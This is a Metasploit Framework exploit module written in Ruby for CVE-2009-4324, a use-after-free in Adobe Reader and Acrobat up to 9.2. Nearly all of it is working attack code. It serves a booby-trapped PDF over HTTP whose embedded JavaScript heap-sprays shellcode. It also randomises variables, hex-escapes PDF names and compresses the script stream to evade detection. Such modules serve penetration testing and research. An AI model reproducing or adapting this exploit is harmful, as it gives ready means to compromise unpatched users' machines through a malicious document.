##
# $Id: adobe_media_newplayer.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe Doc.media.newPlayer Use After Free Vulnerability',
			'Description'    => %q{
					This module exploits a use after free vulnerability in Adobe Reader and Adobe Acrobat
				Professional versions up to and including 9.2.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'unknown', # Found in the wild
					# Metasploit version by:
					'hdm',
					'pusscat',
					'jduck',
					'jabra'
				],
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2009-4324' ],
					[ 'BID', '37331' ],
					[ 'OSVDB', '60980' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
					'DisableNops'    => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# test results (on Windows XP SP3)
					# reader 6.0.1 - vulnerable / doesn't work
					# reader 7.0.5 - untested
					# reader 7.0.8 - untested
					# reader 7.0.9 - vulnerable / doesn't work
					# reader 7.1.0 - untested
					# reader 7.1.1 - untested
					# reader 8.0.0 - untested
					# reader 8.1.1 - works
					# reader 8.1.2 - untested
					# reader 8.1.3 - untested
					# reader 8.1.4 - untested
					# reader 8.1.5 - untested
					# reader 8.1.6 - untested
					# reader 9.0.0 - untested
					# reader 9.1.0 - works
					# reader 9.2 - works (no debugger, no DEP)
					[ 'Adobe Reader Windows English (JS Heap Spray)',
						{
							'Size'      => (0x10000/2),
							'Ret'       => 0x0c0c0c0c
						}
					],
					[ 'Adobe Reader Windows German (JS Heap Spray)',
						{
							'Size'      => (0x10000/2),
							'Ret'       => 0x0a0a0a0a
						}
					],
				],
			'DisclosureDate' => 'Dec 14 2009',
			'DefaultTarget'  => 0))
	end


	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)

		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Make some nops
		nops      = Rex::Text.to_unescape([target.ret].pack('V'))

		# Randomize variables
		#
		len = 72
		rand1  = rand_text_alpha(rand(100) + 1)
		rand2  = rand_text_alpha(rand(100) + 1)
		rand3  = rand_text_alpha(rand(100) + 1)
		rand4  = rand_text_alpha(len/2).gsub(/([dhHjmMsty])/m, '\\\\' + '\1')
		rand5  = rand_text_alpha(len/2).gsub(/([dhHjmMsty])/m, '\\\\' + '\1')

		vtbuf = [target.ret].pack('V') * 4
		vtbuf << rand_text_alpha(len - vtbuf.length)
		vtbuf.gsub!(/([dhHjmMsty])/m, '\\\\' + '\1')
		retstring  = Rex::Text.to_unescape(vtbuf)

		# The printd strings are 72 bytes (??)
		script = %Q|
var #{rand1} = unescape("#{shellcode}");
var #{rand2} = unescape("#{nops}");
var #{rand3} = unescape("#{retstring}");
while(#{rand2}.length <= #{target['Size']}) #{rand2}+=#{rand2};
#{rand2}=#{rand2}.substring(0,#{target['Size']} - #{rand1}.length);
memory=new Array();
for(i=0;i<0x2000;i++) { memory[i]= #{rand2} + #{rand1}; }
util.printd("#{rand4}", new Date());
util.printd("#{rand5}", new Date());
try {this.media.newPlayer(null);} catch(e) {}
util.printd(#{rand3}, new Date());
|
		# Create the pdf
		pdf = make_pdf(script)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		send_response(cli, pdf, { 'Content-Type' => 'application/pdf' })

		handler(cli)

	end

	def RandomNonASCIIString(count)
		result = ""
		count.times do
			result << (rand(128) + 128).chr
		end
		result
	end

	def ioDef(id)
		"%d 0 obj" % id
	end

	def ioRef(id)
		"%d 0 R" % id
	end

	#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
	def nObfu(str)
		result = ""
		str.scan(/./u) do |c|
			if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
				result << "#%x" % c.unpack("C*")[0]
			else
				result << c
			end
		end
		result
	end

	def ASCIIHexWhitespaceEncode(str)
		result = ""
		whitespace = ""
		str.each_byte do |b|
			result << whitespace << "%02x" % b
			whitespace = " " * (rand(3) + 1)
		end
		result << ">"
	end

	def make_pdf(js)

		xref = []
		eol = "\x0d\x0a"
		endobj = "endobj" << eol


		pdf = "%PDF-1.5" << eol
		pdf << "%" << RandomNonASCIIString(4) << eol
		xref << pdf.length
		pdf << ioDef(1) << nObfu("<</Type/Catalog/Outlines ") << ioRef(2) << nObfu("/Pages ") << ioRef(3) << nObfu("/OpenAction ") << ioRef(5) << ">>" << endobj
		xref << pdf.length
		pdf << ioDef(2) << nObfu("<</Type/Outlines/Count 0>>") << endobj
		xref << pdf.length
		pdf << ioDef(3) << nObfu("<</Type/Pages/Kids[") << ioRef(4) << nObfu("]/Count 1>>") << endobj
		xref << pdf.length
		pdf << ioDef(4) << nObfu("<</Type/Page/Parent ") << ioRef(3) << nObfu("/MediaBox[0 0 612 792]>>") << endobj
		xref << pdf.length
		pdf << ioDef(5) << nObfu("<</Type/Action/S/JavaScript/JS ") + ioRef(6) + ">>" << endobj
		xref << pdf.length
		compressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js))
		pdf << ioDef(6) << nObfu("<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>" % compressed.length) << eol
		pdf << "stream" << eol
		pdf << compressed << eol
		pdf << "endstream" << eol
		pdf << endobj
		xrefPosition = pdf.length
		pdf << "xref" << eol
		pdf << "0 %d" % (xref.length + 1) << eol
		pdf << "0000000000 65535 f" << eol
		xref.each do |index|
			pdf << "%010d 00000 n" % index << eol
		end
		pdf << "trailer" << nObfu("<</Size %d/Root " % (xref.length + 1)) << ioRef(1) << ">>" << eol
		pdf << "startxref" << eol
		pdf << xrefPosition.to_s() << eol
		pdf << "%%EOF" << eol

	end

end

